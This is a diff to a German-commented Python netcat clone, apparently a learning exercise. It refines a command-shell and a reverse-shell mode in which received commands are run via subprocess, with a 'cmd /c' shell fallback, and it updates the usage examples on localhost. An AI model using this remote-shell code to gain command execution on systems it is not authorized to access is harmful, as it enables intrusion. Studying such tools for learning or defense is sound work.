@@ -65,12 +65,23 @@ def execute(command):
             shlex.split(cmd), # Zerlegt den Command-String in eine Liste von Argumenten
             stderr=subprocess.STDOUT, # Standard Error -> STDOUT: Fehler werden in die Standardausgabe umgeleitet
         )
-        return output.decode("utf-8") # Bytes -> String (UTF-8)
+        return output.decode(errors="replace") # Bytes -> String (Systemcodepage, unbekannte Zeichen ersetzen)
 
+    # falls Befehl nicht gefunden wird "cmd \c {cmd}" als Fallback (Windows)
     except FileNotFoundError:
-        return f"[!] Befehl nicht gefunden: '{cmd}' (kein Executable - CMD built-ins via 'cmd /c {cmd}')\n"
+        try:
+            output = subprocess.check_output(
+                f"cmd /c {cmd}",
+                stderr=subprocess.STDOUT,
+                shell=True,
+            )
+            return output.decode(errors="replace")
+        
+        except subprocess.CalledProcessError as e:
+            return e.output.decode(errors="replace")
+        
     except subprocess.CalledProcessError as e:
-        return e.output.decode("utf-8")  # Fehlermeldung des Befehls zurückgeben
+        return e.output.decode(errors="replace")  # Fehlermeldung des Befehls zurückgeben
 
 class FerNet:
     """
@@ -259,11 +270,11 @@ class FerNet:
         elif self.args.command: # COMMAND SHELL-MODUS
             cmd_buffer = b"" # Buffer für empfangene Befehle
 
+            # Ersten Prompt senden (einmalig, da noch kein Output vorliegt)
+            client_socket.send(b"ServerPrompt> ")
+
             while True:
                 try:
-                    # Prompt senden
-                    client_socket.send(b"ServerPrompt> ")
-
                     # Eingabe empfangen bis ein Newline kommt
                     # Befehl erst komplett, wenn Enter gedrückt -> \n
                     while b"\n" not in cmd_buffer:
@@ -272,12 +283,17 @@ class FerNet:
                         cmd_buffer += client_socket.recv(64)
 
                     # Befehl ausführen
-                    response = execute(cmd_buffer.decode("utf-8")) # Bytes -> String, Befehl ausführen, Output zurückbekommen    
-                    if response: # Nur senden, wenn es eine Antwort gibt
-                        client_socket.send(response.encode("utf-8")) # Output an Client senden (String -> Bytes)
+                    response = execute(cmd_buffer.decode(errors="replace")) # Bytes -> String, Befehl ausführen, Output zurückbekommen
 
                     # Buffer zurücksetzen für nächsten Befehl
                     cmd_buffer = b""
+
+                    # Response + nächsten Prompt in einem send() schicken.
+                    # zwei separate send()-Aufrufe (response, dann prompt) kommen als zwei TCP-Pakete an. 
+                    # Der Client ruft input() nach dem ersten recv() auf -> er fragt nach Eingabe bevor der Prompt angezeigt wurde (1-Zyklus-Versatz).
+                    # Ein kombinierter send() stellt sicher, dass der Client immer "Output\nServerPrompt> " zusammen empfängt.
+                    output = (response if response else "") + "ServerPrompt> "
+                    client_socket.send(output.encode("utf-8")) # Output + Prompt an Client senden
 
                 except Exception as e:
                     print(f"[*] Exception: {e}")
@@ -291,11 +307,34 @@ class FerNet:
         elif self.args.reverse:
             # Client hat sich mit Shell verbunden - Server tippt Befehle, Client führt sie aus und sendet Output zurück -> Reverse Shell
             while True:
-                client_socket.send(b"RevShell> ")
+                # Befehl vom Server-Operator einlesen und mit Newline abschließen -> Signal für den Client, den Befehl auszuführen
+                # (Client-Seite wartet in recv-Schleife auf '\n' bevor execute() aufgerufen wird)
                 cmd = input("R#> ") + '\n'
+
+                # Befehl an den Client schicken (String -> Bytes)
                 client_socket.send(cmd.encode())
-                response = client_socket.recv(4096)
-                print(response.decode())
+
+                # --- Antwort empfangen: Non-Blocking Loop mit Timeout ---
+                # Problem: TCP ist ein Stream - es gibt kein "Ende-Paket".
+                # recv(4096) würde nach dem ersten Chunk blockieren und nie zurückkehren.
+                # Lösung: Socket auf 1 Sekunde Timeout setzen.
+                # Nach 1s ohne neue Daten wirft recv() eine TimeoutError -> Empfang beendet.
+                client_socket.settimeout(1.0)
+                response = b""
+                try:
+                    while True:
+                        chunk = client_socket.recv(4096) # Empfängt bis zu 4096 Bytes pro Iteration
+                        if not chunk: # Leeres Bytes-Objekt = Client hat Verbindung geschlossen
+                            break
+                        response += chunk # Chunk an Gesamtantwort anhängen
+                except TimeoutError:
+                    pass # Timeout -> keine weiteren Daten, Empfang beendet
+
+                # Socket wieder in Blocking-Modus zurücksetzen für die nächste input()-Runde
+                client_socket.settimeout(None)
+
+                # Antwort ausgeben (errors="replace": nicht-UTF-8 Bytes als '?' darstellen statt Exception)
+                print(response.decode(errors="replace"))
             
 
 # =============================================================================
@@ -319,19 +358,16 @@ if __name__ == "__main__":
             Client: > python FerNet.py -t 127.0.0.1 -p 4554 -c
 
         Reverse-Shell (Client führt Befehle aus):                               
-            Server: > python FerNet.py -t
-            Client: > python FerNet.py -t                                                
+            Server: > python FerNet.py -t 127.0.0.1 -p 4554 -l -r
+            Client: > python FerNet.py -t 127.0.0.1 -p 4554 -r                                               
 
         Datei-Upload
             Server (Empfänger): > python Network.py -t 0.0.0.0 -p 4444 -l -u outfile.txt
             Client (Sender):    > python Network.py -t 127.0.0.1 -p 4444 -f infile.txt
-
                                
-        Text an Server senden (Client-Seite):
-            echo 'ABC' | python chapter02_basic_networking.py -t 192.168.1.108 -p 135
-
-        Einfach verbinden:
-            python chapter02_basic_networking.py -t 192.168.1.108 -p 5555
+        Einfache Verbindung
+            Server: > python FerNet.py -l
+            Client: > python FerNet.py -t                       
         ''')
     )
 
